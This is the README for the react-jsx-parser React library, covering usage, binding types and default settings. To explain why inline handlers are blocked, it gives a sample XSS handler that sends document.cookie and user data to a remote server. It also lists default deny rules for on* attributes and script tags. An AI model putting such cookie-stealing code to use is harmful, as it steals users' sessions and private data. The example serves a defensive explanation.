# react-jsx-parser [![CircleCI][circle-ci-badge]](https://circleci.com/gh/TroyAlford/react-jsx-parser) [![Version][npm-version]][npm-link] [![NPM Downloads][npm-downloads]][npm-link] [![License][npm-license]](https://github.com/TroyAlford/react-jsx-parser/blob/master/LICENSE)

[circle-ci-badge]: https://img.shields.io/circleci/project/github/TroyAlford/react-jsx-parser/master.svg
[npm-version]: https://img.shields.io/npm/v/react-jsx-parser.svg
[npm-downloads]: https://img.shields.io/npm/dt/react-jsx-parser.svg
[npm-license]: https://img.shields.io/npm/l/react-jsx-parser.svg
[npm-link]: https://www.npmjs.com/package/react-jsx-parser

A React component which can parse JSX and output rendered React Components.

## Basic Usage - Injecting JSX as a String
```javascript
import React from 'react'
import JsxParser from 'react-jsx-parser'
import Library from 'some-library-of-components'

class InjectableComponent extends Component {
  static defaultProps = {
    eventHandler: () => {}
  }
  // ... inner workings of InjectableComponent
}

const MyComponent = () => (
  <JsxParser
    bindings={{
      foo: 'bar',
      myEventHandler: () => { /* ... do stuff ... */ },
    }}
    components={{ InjectableComponent, Library }}
    jsx={`
      <h1>Header</h1>
      <InjectableComponent eventHandler={myEventHandler} truthyProp />
      <Library.SomeComponent someProp={foo} calc={1 + 1} stringProp="foo" />
    `}
  />
)
```

Because `InjectableComponent` is passed into the `JsxParser.props.components` prop, it is treated as a known element
type, and created using `React.createElement(...)` when parsed out of the JSX. You can also pass in a whole collection
of components, as shown by the `Library` binding, and then access the individual items with `LibraryName.ComponentName`.

Finally, a note about property bindings. The `JsxParser` can handle several types of binding:
 - implicit `true` bindings, such as `<InjectableComponent truthyProp />` (equivalent to `truthyProp={true}`)
 - string-value binding, such as `stringProp="foo"`
 - expression-binding, such as `calc={1 + 1}`
 - named-value binding, such as `eventHandler={myEventHandler}` (note that this requires a match in `bindings`)

The component **_does not_** support inline function declarations, such as:
 - `onClick={function (event) { /* do stuff */ }}`, or
 - `onKeyPress={event => { /* do stuff */}}`

This is to prevent inadvertent XSS attack vectors. Since the primary use of this component is to allow JSX to be stored server-side, and then late-interpreted at the client-side, this restriction prevents a malicious user from stealing info by executing a situation like:
```javascript
<JsxParser
  bindings={{ userInfo: { private: 'data' } }}
  onClick={() => {
    fetch('/some/remote/server', {
      body: JSON.stringify({ cookies: document.cookie, userInfo })
    })
  }}
/>
```

## Advanced Usage - Injecting Dynamic JSX
```javascript
// Import desired set of components
import { ComponentA, ComponentB } from 'somePackage/Components'
import ComponentC from 'somePackage/ComponentC'
import ComponentD from 'somePackage/ComponentD'
...
// Load an HTML or XML fragment from a remote API
const dynamicHtml = loadRemoteData()
...
// Within your component's render method, bind these components and the fragment as props
<JsxParser
  bindings={bindings}
  components={{ ComponentA, ComponentB, ComponentC, ComponentD }}
  jsx={dynamicHtml}
/>
```

Any `ComponentA`, `ComponentB`, `ComponentC` or `ComponentD` tags in the dynamically loaded XML/HTML fragment will be rendered as React components. Any unrecognized tags will be handled by `React`.

_Note:_ Non-standard tags may throw errors and warnings, but will typically be rendered in a reasonable way.

## PropTypes / Settings
```javascript
JsxParser.defaultProps = {
  // if false, unrecognized elements like <foo> are omitted and reported via onError
  allowUnknownElements: true, // by default, allow unrecognized elements

  bindings: {}, // by default, do not add any additional bindings

  // by default, just removes `on*` attributes (onClick, onChange, etc.)
  // values are used as a regex to match property names
  blacklistedAttrs: [/^on.+/i],

  blacklistedTags:  ['script'], // by default, removes all <script> tags

  className: '', // space-delimited classes to add to wrapper (ignored if renderInWrapper=false)

  components: {}, // an object map of component tag-names to their definitions - see above
  // components must extend React.Component, React.PureComponent, or be a Function

  componentsOnly: false, // non-component HTML tags are allowed by default, omitted if true

  disableFragments: false, // if true, React <Fragment />s will not be used.
  // Note: This introduces subtle errors with regard to white-space, and is provided only for
  // backward compatibility with React 15.x

  disableKeyGeneration: false, // if true, rendering will not automatically generate `key` props.
  // Note: This may result in the "Child elements should have a unique 'key' prop " React error.

  jsx: '', // the jsx string to be parsed & rendered

  onError: () => {}, // if specified, any rendering errors are reported via this method

  showWarnings: false, // if true showWarnings, rendering errors are output with console.warn

  renderError: undefined, // if specified, this function can be used to render errors as a fallback

  renderInWrapper: true, // if false, the HTML output will have no <div> wrapper

  renderUnrecognized: tagName => null, // unrecognized tags are rendered via this method
}
```

## Older Browser Support

If your application needs to support older browsers, like `IE11`, import from `react-jsx-parser/lib/es5/react-jsx-parser.min.js`,
which transpiles the `acorn-jsx` dependency down to ES5, and also adds additional polyfill support for code used in this package.

**Note**: <u>not</u> recommended for implementations which only support modern browsers, as the ES5 version is roughly 30% larger.
